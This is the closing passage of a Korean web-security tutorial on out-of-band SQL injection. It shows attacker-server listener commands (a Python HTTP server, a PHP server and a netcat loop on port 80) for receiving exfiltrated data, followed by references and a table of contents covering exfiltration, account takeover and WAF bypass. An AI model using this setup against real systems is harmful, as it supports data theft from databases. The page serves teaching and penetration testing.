<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Python HTTP 서버</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sudo python3 -m http.server 80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># PHP 로거</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">php -S 0.0.0.0:80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Netcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while true; do nc -lvp 80; done</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="참고-자료">참고 자료<a href="#참고-자료" class="hash-link" aria-label="Direct link to 참고 자료" title="Direct link to 참고 자료" translate="no">​</a></h2>
<ul>
<li>OWASP Out-of-Band SQLi: <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection#out-of-band-exploitation" target="_blank" rel="noopener noreferrer">https://owasp.org/www-community/attacks/Blind_SQL_Injection#out-of-band-exploitation</a></li>
<li>PortSwigger OOB SQLi: <a href="https://portswigger.net/web-security/sql-injection/blind#out-of-band-oob-techniques" target="_blank" rel="noopener noreferrer">https://portswigger.net/web-security/sql-injection/blind#out-of-band-oob-techniques</a></li>
<li>HackTricks OOB: <a href="https://book.hacktricks.xyz/pentesting-web/sql-injection#out-of-band-exploitation" target="_blank" rel="noopener noreferrer">https://book.hacktricks.xyz/pentesting-web/sql-injection#out-of-band-exploitation</a></li>
<li>Burp Collaborator: <a href="https://portswigger.net/burp/documentation/collaborator" target="_blank" rel="noopener noreferrer">https://portswigger.net/burp/documentation/collaborator</a></li>
<li>DNS Exfiltration: <a href="https://github.com/m57/dnsteal" target="_blank" rel="noopener noreferrer">https://github.com/m57/dnsteal</a></li>
</ul>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="다음-단계">다음 단계<a href="#다음-단계" class="hash-link" aria-label="Direct link to 다음 단계" title="Direct link to 다음 단계" translate="no">​</a></h2>
<p>Out-of-Band를 마스터했다면, 다른 고급 기법을 학습하세요:</p>
<ul>
<li><a href="/my-docusaurus-page/web_attacks/sql_injection/stacked_queries/">Stacked Queries</a> - 여러 쿼리 동시 실행</li>
<li><a href="/my-docusaurus-page/web_attacks/sql_injection/second_order/">Second-Order SQLi</a> - 저장 후 실행되는 SQLi</li>
<li><a href="/my-docusaurus-page/web_attacks/sql_injection/waf_bypass/">WAF 우회 기법</a> - 방어 메커니즘 우회</li>
</ul></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/my-docusaurus-page/web_attacks/sql_injection/time_based/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Time-based Blind SQL Injection</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/my-docusaurus-page/web_attacks/sql_injection/stacked_queries/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Stacked Queries SQL Injection</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#개념-concept" class="table-of-contents__link toc-highlight">개념 (Concept)</a><ul><li><a href="#out-of-band-sqli란" class="table-of-contents__link toc-highlight">Out-of-Band SQLi란?</a></li><li><a href="#일반-sqli-vs-out-of-band-sqli" class="table-of-contents__link toc-highlight">일반 SQLi vs Out-of-Band SQLi</a></li><li><a href="#사용-시나리오" class="table-of-contents__link toc-highlight">사용 시나리오</a></li></ul></li><li><a href="#dbms별-out-of-band-기법" class="table-of-contents__link toc-highlight">DBMS별 Out-of-Band 기법</a><ul><li><a href="#mysql" class="table-of-contents__link toc-highlight">MySQL</a></li><li><a href="#mssql-microsoft-sql-server" class="table-of-contents__link toc-highlight">MSSQL (Microsoft SQL Server)</a></li><li><a href="#postgresql" class="table-of-contents__link toc-highlight">PostgreSQL</a></li><li><a href="#oracle" class="table-of-contents__link toc-highlight">Oracle</a></li></ul></li><li><a href="#수동-공격-manual-exploitation" class="table-of-contents__link toc-highlight">수동 공격 (Manual Exploitation)</a><ul><li><a href="#단계-1-공격자-서버-준비" class="table-of-contents__link toc-highlight">단계 1: 공격자 서버 준비</a></li><li><a href="#단계-2-out-of-band-취약점-테스트" class="table-of-contents__link toc-highlight">단계 2: Out-of-Band 취약점 테스트</a></li><li><a href="#단계-3-데이터-정제-및-디코딩" class="table-of-contents__link toc-highlight">단계 3: 데이터 정제 및 디코딩</a></li></ul></li><li><a href="#자동화-도구-automated-tools" class="table-of-contents__link toc-highlight">자동화 도구 (Automated Tools)</a><ul><li><a href="#sqlmap---out-of-band" class="table-of-contents__link toc-highlight">SQLMap - Out-of-Band</a></li><li><a href="#xxeinjector-xxe--oob" class="table-of-contents__link toc-highlight">XXEinjector (XXE + OOB)</a></li><li><a href="#oob-sqli-helper-scripts" class="table-of-contents__link toc-highlight">OOB-SQLi Helper Scripts</a></li></ul></li><li><a href="#고급-기법" class="table-of-contents__link toc-highlight">고급 기법</a><ul><li><a href="#1-다단계-oob-multi-step" class="table-of-contents__link toc-highlight">1. 다단계 OOB (Multi-Step)</a></li><li><a href="#2-oob--xxe-결합" class="table-of-contents__link toc-highlight">2. OOB + XXE 결합</a></li><li><a href="#3-ssrf--oob" class="table-of-contents__link toc-highlight">3. SSRF + OOB</a></li><li><a href="#4-파일-읽기--oob" class="table-of-contents__link toc-highlight">4. 파일 읽기 + OOB</a></li></ul></li><li><a href="#실전-공격-시나리오" class="table-of-contents__link toc-highlight">실전 공격 시나리오</a><ul><li><a href="#시나리오-완전-blind-환경에서-관리자-계정-탈취" class="table-of-contents__link toc-highlight">시나리오: 완전 Blind 환경에서 관리자 계정 탈취</a></li></ul></li><li><a href="#방어-기법" class="table-of-contents__link toc-highlight">방어 기법</a><ul><li><a href="#1-네트워크-레벨-차단" class="table-of-contents__link toc-highlight">1. 네트워크 레벨 차단</a></li><li><a href="#2-dbms-권한-제한" class="table-of-contents__link toc-highlight">2. DBMS 권한 제한</a></li><li><a href="#3-dns-싱크홀-dns-sinkhole" class="table-of-contents__link toc-highlight">3. DNS 싱크홀 (DNS Sinkhole)</a></li><li><a href="#4-애플리케이션-레벨-방어" class="table-of-contents__link toc-highlight">4. 애플리케이션 레벨 방어</a></li><li><a href="#5-모니터링-및-탐지" class="table-of-contents__link toc-highlight">5. 모니터링 및 탐지</a></li></ul></li><li><a href="#waf-우회-기법" class="table-of-contents__link toc-highlight">WAF 우회 기법</a><ul><li><a href="#1-dns-터널링-우회" class="table-of-contents__link toc-highlight">1. DNS 터널링 우회</a></li><li><a href="#2-http-헤더-사용" class="table-of-contents__link toc-highlight">2. HTTP 헤더 사용</a></li><li><a href="#3-icmp-터널링" class="table-of-contents__link toc-highlight">3. ICMP 터널링</a></li></ul></li><li><a href="#트러블슈팅-체크리스트" class="table-of-contents__link toc-highlight">트러블슈팅 체크리스트</a><ul><li><a href="#dns-쿼리가-수신되지-않을-때" class="table-of-contents__link toc-highlight">DNS 쿼리가 수신되지 않을 때</a></li><li><a href="#http-요청이-수신되지-않을-때" class="table-of-contents__link toc-highlight">HTTP 요청이 수신되지 않을 때</a></li><li><a href="#데이터가-잘려서-수신될-때" class="table-of-contents__link toc-highlight">데이터가 잘려서 수신될 때</a></li><li><a href="#sqlmap-oob가-작동하지-않을-때" class="table-of-contents__link toc-highlight">SQLMap OOB가 작동하지 않을 때</a></li></ul></li><li><a href="#빠른-명령어-참조-quick-reference" class="table-of-contents__link toc-highlight">빠른 명령어 참조 (Quick Reference)</a><ul><li><a href="#mssql---dns-exfiltration" class="table-of-contents__link toc-highlight">MSSQL - DNS Exfiltration</a></li><li><a href="#oracle---http-exfiltration" class="table-of-contents__link toc-highlight">Oracle - HTTP Exfiltration</a></li><li><a href="#oracle---dns-exfiltration" class="table-of-contents__link toc-highlight">Oracle - DNS Exfiltration</a></li><li><a href="#postgresql---copy-to-program" class="table-of-contents__link toc-highlight">PostgreSQL - COPY TO PROGRAM</a></li><li><a href="#sqlmap-oob" class="table-of-contents__link toc-highlight">SQLMap OOB</a></li><li><a href="#dns-서버-설정-1" class="table-of-contents__link toc-highlight">DNS 서버 설정</a></li><li><a href="#http-서버-설정-1" class="table-of-contents__link toc-highlight">HTTP 서버 설정</a></li></ul></li><li><a href="#참고-자료" class="table-of-contents__link toc-highlight">참고 자료</a></li><li><a href="#다음-단계" class="table-of-contents__link toc-highlight">다음 단계</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/my-docusaurus-page/">Tutorial</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://stackoverflow.com/questions/tagged/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Stack Overflow<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://discordapp.com/invite/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">Discord<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://x.com/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">X<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2026 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>